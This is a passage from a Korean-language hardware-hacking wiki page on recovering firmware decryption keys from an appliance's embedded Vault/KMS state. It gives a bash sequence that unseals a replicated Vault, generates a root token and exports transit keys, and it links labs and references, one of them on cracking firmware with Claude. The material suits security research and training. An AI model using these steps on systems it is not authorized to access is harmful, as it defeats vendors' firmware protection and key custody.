  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 임베디드 KMS/Vault 상태에서 firmware 복호화 키 복구하기

Update image에 작은 평문 metadata와 크고 엔트로피가 높은 blob이 함께 들어 있다면, 무차별 대입을 하기 전에 container를 먼저 분석하세요:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, `binwalk -E`를 사용해 header, offset, 줄 경계를 덤프합니다.
- `Salted__`는 대개 OpenSSL `enc` format을 의미합니다. 다음 8바이트는 salt이고 나머지는 ciphertext입니다.
- 디코딩 결과가 정확히 `256`바이트인 Base64 field는 RSA-2048 ciphertext가 임의의 firmware password/session key를 감싸고 있다는 강력한 단서입니다.
- 같은 파일에 있는 detached PGP 자료는 보통 authenticity만 보호합니다. 이를 confidentiality mechanism이라고 가정하지 마세요.

정적 키 검색(`grep`, `strings`, PEM/PGP 검색)이 실패하면 private key만 계속 찾기보다 **operational decrypt 경로**를 reverse engineering하세요.

- Updater / management binary를 decompile하고, 어떤 코드가 암호화된 blob을 읽는지, 어떤 helper/API가 이를 unwrap하는지, 어떤 logical key name을 요청하는지 추적합니다.
- 추출한 root filesystem에서 KMS 상태(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), unit file, init script를 검색합니다.
- 평문 `vault operator unseal ...`, recovery key, bootstrap token 또는 로컬 KMS auto-unseal script를 private-key 자료와 동등하게 취급합니다.

Appliance에 원본 Vault binary와 storage backend가 포함되어 있다면, Vault 내부를 재구현하는 것보다 해당 환경을 재현하는 편이 대개 더 쉽습니다.

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

복제한 KMS에서 root 권한을 확보한 상태에서:

- 격리된 복제본 내에서만 transit keys를 export할 수 있도록 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap key를 export합니다: `vault read transit/export/encryption-key/<name>`
- 복구한 RSA key에 KMS에서 사용한 것과 정확히 같은 padding/hash 조합을 적용해 봅니다. PKCS#1 v1.5 복호화와 기본 OAEP 복호화가 모두 실패해도 key가 잘못되었다는 뜻은 아닙니다. Vault 기반 흐름은 OAEP와 SHA-256을 사용하는 경우가 많지만, 흔히 쓰이는 라이브러리의 기본값은 SHA-1입니다.
- payload가 `Salted__`로 시작한다면, AES-CBC 복호화를 시도하기 전에 vendor의 OpenSSL KDF(`EVP_BytesToKey`, 레거시 appliance에서는 MD5를 사용하는 경우가 많음)를 정확히 재현합니다.

이렇게 하면 "encrypted firmware"는 더 일반적인 문제로 바뀝니다. **appliance 측 operational keys를 복구한 다음, 정확한 unwrap 및 KDF 매개변수를 오프라인에서 재현하는 것입니다.**

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude를 이용한 펌웨어 크래킹: 시니어급 기술, 주니어급 자율성](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [펌웨어 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [실전 IoT 해킹: 사물 인터넷 공격을 위한 결정판 가이드](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [방치된 하드웨어의 zero-day 취약점 악용 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 스마트 기기로 타인의 집에 접근한 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [이제 mi가 보이시죠: 이제 해킹당하셨습니다](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 커넥터를 통한 Tesla Wall Connector 악용 - 2부: anti-downgrade 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [깜빡이게 만들기: Philips Hue Bridge의 무선 업데이트 악용](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
